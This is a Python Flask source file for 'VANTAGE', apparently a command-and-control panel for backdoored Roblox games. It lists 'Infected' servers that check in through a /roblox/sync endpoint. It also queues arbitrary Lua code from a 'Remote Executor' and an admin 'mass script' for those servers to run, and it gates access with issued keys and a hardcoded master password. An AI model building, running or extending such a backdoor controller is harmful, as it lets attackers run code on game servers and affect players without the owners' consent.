import requests, time, os, uuid, random, string
from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "vantage_v30_final_tier"
MASTER_ADMIN_PW = "SkibidiToiletSigmaRizzler" 

global_servers = {} 
user_sessions = {}
valid_keys = {}
mass_execute_queue = []
announcements = [] # New system for announcements

def generate_key(k_type="standard"):
    k = "VANTAGE-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    valid_keys[k] = k_type
    return k

BASE_CSS = """
:root { --gold: #ffd700; --bg: #050505; --card: rgba(20, 20, 20, 0.8); --border: rgba(255, 215, 0, 0.3); --accent: #bc13fe; }
* { box-sizing: border-box; transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
body { background: var(--bg); color: #fff; font-family: 'Inter', 'Segoe UI', sans-serif; margin: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }

.navbar { background: rgba(0,0,0,0.9); border-bottom: 1px solid var(--border); display: flex; justify-content: center; gap: 30px; padding: 20px; z-index: 100; backdrop-filter: blur(10px); }
.nav-item { color: #666; cursor: pointer; font-weight: 800; font-size: 12px; text-transform: uppercase; letter-spacing: 3px; position: relative; }
.active-nav { color: var(--gold); text-shadow: 0 0 15px var(--gold); }
.active-nav::after { content: ''; position: absolute; bottom: -10px; left: 0; width: 100%; height: 2px; background: var(--gold); box-shadow: 0 0 10px var(--gold); }

.viewport { flex: 1; padding: 30px; overflow-y: auto; background: radial-gradient(circle at top right, #1a1a1a, #050505); }

/* Announcement UI */
.announcement-container { max-width: 1200px; margin: 0 auto 20px auto; }
.ann-card { background: linear-gradient(90deg, rgba(188, 19, 254, 0.1), rgba(255, 215, 0, 0.1)); border-left: 4px solid var(--gold); padding: 15px 25px; border-radius: 10px; margin-bottom: 10px; border-top: 1px solid var(--border); }
.ann-meta { font-size: 10px; color: var(--gold); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }

.card { background: var(--card); border: 1px solid var(--border); padding: 18px; border-radius: 20px; backdrop-filter: blur(20px); position: relative; overflow: hidden; }
.card:hover { border-color: var(--gold); transform: translateY(-5px); box-shadow: 0 10px 30px rgba(255, 215, 0, 0.1); }

.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 25px; max-width: 1200px; margin: auto; }
.server-thumb { width: 100%; height: 150px; object-fit: cover; border-radius: 12px; border: 1px solid #333; margin-bottom: 15px; }
.server-info { font-size: 12px; line-height: 1.6; color: #ccc; }
.server-info b { color: var(--gold); font-weight: 900; }

.btn { background: var(--gold); color: #000; border: none; padding: 15px; border-radius: 12px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 12px; margin-top: 10px; }
.btn-admin { background: var(--accent); color: #fff; }

input, textarea { background: rgba(255,255,255,0.05); border: 1px solid var(--border); padding: 15px; color: #fff; width: 100%; border-radius: 12px; outline: none; margin-bottom: 15px; }
textarea { color: #0f0; font-family: 'Fira Code', monospace; height: 200px; }

.hidden { display: none !important; }
"""

DASH_HTML = """
<!DOCTYPE html><html><head><title>VANTAGE ON TOP</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>""" + BASE_CSS + """</style></head>
<body>
    {% if not logged_in %}
    <div style="display:flex; align-items:center; justify-content:center; height:100vh;">
        <div class="card" style="width:360px; text-align:center;">
            <h1 style="color:var(--gold); letter-spacing:10px;">VANTAGE</h1>
            <form method="POST" action="/login"><input type="password" name="pw" placeholder="ENTER ACCESS KEY"><button class="btn">INITIALIZE</button></form>
        </div>
    </div>
    {% else %}
    <div class="navbar">
        <div class="nav-item active-nav" onclick="tab('live', this)">Infected</div>
        <div class="nav-item" onclick="tab('exec', this)">Executor</div>
        <div class="nav-item" onclick="tab('white', this)">Whitelist</div>
        {% if is_admin %}<div class="nav-item" style="color:var(--accent);" onclick="tab('master', this)">Admin Panel</div>{% endif %}
    </div>
    <div class="viewport">
        <div id="announcement_area" class="announcement-container"></div>

        <div id="live" class="tab">
            <div id="server_grid" class="grid"></div>
        </div>

        <div id="exec" class="tab hidden"><div class="card" style="max-width: 800px; margin: auto;"><h3>REMOTE EXECUTOR</h3><textarea id="code_area" placeholder="-- Input Lua code here..."></textarea><button id="exec_btn" class="btn" onclick="execute()">RUN SCRIPT</button></div></div>
        
        <div id="white" class="tab hidden"><div class="card" style="max-width: 450px; margin: auto; text-align: center;"><h3>PLAYER WHITELIST</h3><input id="w_input" placeholder="Roblox Username"><button id="w_btn" class="btn" onclick="addWhite()">WHITELIST USER</button><div id="profile_box" class="hidden" style="margin-top:20px;"><img id="p_img" src="" style="width:100px; border-radius:50%; border: 2px solid var(--gold);"><h2 id="p_name"></h2><button class="btn" style="background:#ff4444; color:#fff;" onclick="resetWhite()">RESET TARGET</button></div></div></div>
        
        {% if is_admin %}
        <div id="master" class="tab hidden">
            <div class="card" style="max-width: 700px; margin: auto;">
                <h2 style="color:var(--accent);">Admin Dashboard</h2>
                <div style="margin-bottom: 25px;">
                    <p style="font-size:11px; color:#888;">GLOBAL ANNOUNCEMENT</p>
                    <input id="ann_text" placeholder="Something to say?">
                    <button class="btn btn-admin" onclick="postAnn()">POST ANNOUNCEMENT</button>
                </div>
                <hr style="border:0; border-top:1px solid #333; margin:20px 0;">
                <textarea id="mass_code" style="height:100px;" placeholder="-- MASS SCRIPT (ALL SERVERS)"></textarea>
                <button class="btn btn-admin" onclick="massExec()">SEND TO ALL</button>
            </div>
        </div>
        {% endif %}
    </div>
    {% endif %}
<script>
    function tab(name, el) { document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden')); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav')); document.getElementById(name).classList.remove('hidden'); el.classList.add('active-nav'); }
    
    function sync() {
        fetch('/api/sync_data').then(r => r.json()).then(data => {
            // Update Servers
            let sHtml = "";
            let grid = document.getElementById('server_grid');
            if (Object.keys(data.servers).length === 0) {
                sHtml = `<div style="text-align:center; padding:100px; color:#444; font-weight:900; grid-column: 1/-1;">NO SERVERS INFECTED</div>`;
            } else {
                for(let id in data.servers) { 
                    let s = data.servers[id]; 
                    sHtml += `<div class="card"><img src="${s.thumb}" class="server-thumb"><div class="server-info"><b>GAME:</b> ${s.name}<br><b>OWNER:</b> ${s.owner}<br><b>PLAYERS:</b> ${s.p_count}</div><button class="btn" onclick="launch('${id}', '${s.place_id}')">JOIN GAME</button></div>`; 
                }
            }
            grid.innerHTML = sHtml;

            // Update Announcements
            let aHtml = "";
            data.announcements.reverse().forEach(a => {
                aHtml += `<div class="ann-card"><div class="ann-meta">${a.user} • ${a.time}</div><div class="ann-content">${a.text}</div></div>`;
            });
            document.getElementById('announcement_area').innerHTML = aHtml;
        });
    }

    function launch(jid, pid) {
        const url = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? `roblox://placeId=${pid}&gameInstanceId=${jid}` : `roblox-player:1+launchmode:play+gameinstanceid:${jid}+placeid:${pid}`;
        window.location.href = url;
    }

    function execute() {
        fetch('/api/execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('code_area').value})}).then(()=>alert("Executed!"));
    }

    function postAnn() {
        fetch('/api/admin/announce', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({text: document.getElementById('ann_text').value})}).then(() => {
            document.getElementById('ann_text').value = "";
            sync();
        });
    }

    function addWhite() { 
        fetch('/api/whitelist', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user: document.getElementById('w_input').value})}).then(sync); 
    }

    function massExec() { fetch('/api/admin/mass_execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('mass_code').value})}).then(()=>alert("Sent to all!")); }
    function resetWhite() { fetch('/api/reset', {method:'POST'}).then(sync); }
    
    if (document.getElementById('server_grid')) setInterval(sync, 4000);
</script></body></html>
"""

@app.route('/')
def index(): return render_template_string(DASH_HTML, logged_in=session.get('logged_in'), is_admin=session.get('is_admin'))

@app.route('/login', methods=['POST'])
def login():
    pw = request.form.get("pw")
    if pw == MASTER_ADMIN_PW: session.update({'logged_in': True, 'is_admin': True, 'sid': 'MASTER_SESSION', 'user': 'MASTER'})
    elif pw in valid_keys:
        k_type = valid_keys[pw]
        session.update({'logged_in': True, 'is_admin': (k_type == 'admin'), 'sid': str(uuid.uuid4()), 'user': 'ADMIN' if k_type == 'admin' else 'USER'})
        del valid_keys[pw]
    return redirect(url_for('index'))

@app.route('/api/sync_data')
def sync_data():
    return jsonify({
        "servers": global_servers,
        "announcements": announcements[-5:] # Show last 5
    })

@app.route('/api/admin/announce', methods=['POST'])
def admin_announce():
    if not session.get('is_admin'): return jsonify({}), 403
    announcements.append({
        "user": session.get('user', 'ADMIN'),
        "text": request.json.get("text"),
        "time": time.strftime("%H:%M")
    })
    return jsonify({"ok": True})

@app.route('/roblox/sync', methods=['POST'])
def roblox_sync():
    global mass_execute_queue
    data = request.json
    jid = data.get("jobId")
    if not jid: return jsonify({"commands": []})

    # DEDUPLICATION LOGIC: Always update existing server info rather than making new ones
    if jid not in global_servers:
        try:
            t = requests.get(f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={data.get('game_id')}&size=150x150&format=Png").json()
            thumb_url = t["data"][0]["imageUrl"] if t.get("data") else ""
        except: thumb_url = ""
        global_servers[jid] = {"thumb": thumb_url, "place_id": data.get("game_id")}
    
    global_servers[jid].update({
        "name": data.get("name"), 
        "owner": data.get("owner"), 
        "p_count": len(data.get("players", [])), 
        "last_ping": time.time()
    })
    
    # Remove servers that haven't pinged in 60s (adjust as needed)
    dead = [k for k, v in global_servers.items() if time.time() - v.get('last_ping', 0) > 60]
    for k in dead: del global_servers[k]

    all_cmds = []
    for mc in mass_execute_queue: all_cmds.append({"user": "ALL", "code": mc})
    if mass_execute_queue: mass_execute_queue = []

    players = [p.lower() for p in data.get("players", [])]
    for sid, info in user_sessions.items():
        if info.get("whitelist") and info["whitelist"]["name"].lower() in players:
            for c in info["queue"]: all_cmds.append({"user": info["whitelist"]["name"], "code": c})
            user_sessions[sid]["queue"] = []
    return jsonify({"commands": all_cmds})

# ... (Keep existing /api/execute, /api/whitelist, /api/reset routes from previous version) ...

@app.route('/api/whitelist', methods=['POST'])
def add_white():
    sid, user = session.get('sid'), request.json.get("user")
    try:
        r = requests.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [user]}).json()
        if r.get("data") and sid:
            uid, name = r["data"][0]["id"], r["data"][0]["requestedUsername"]
            img = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png").json()["data"][0]["imageUrl"]
            user_sessions[sid] = {"whitelist": {"name": name, "img": img}, "queue": []}
    except: pass
    return jsonify({"ok": True})

@app.route('/api/reset', methods=['POST'])
def reset_white():
    if session.get('sid') in user_sessions: user_sessions[session.get('sid')]["whitelist"] = None
    return jsonify({"ok": True})

@app.route('/api/execute', methods=['POST'])
def run_exec():
    if session.get('sid') in user_sessions: user_sessions[session.get('sid')]["queue"].append(request.json.get("code"))
    return jsonify({"ok": True})

@app.route('/api/admin/mass_execute', methods=['POST'])
def admin_mass():
    if session.get('is_admin'): mass_execute_queue.append(request.json.get("code"))
    return jsonify({"ok": True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
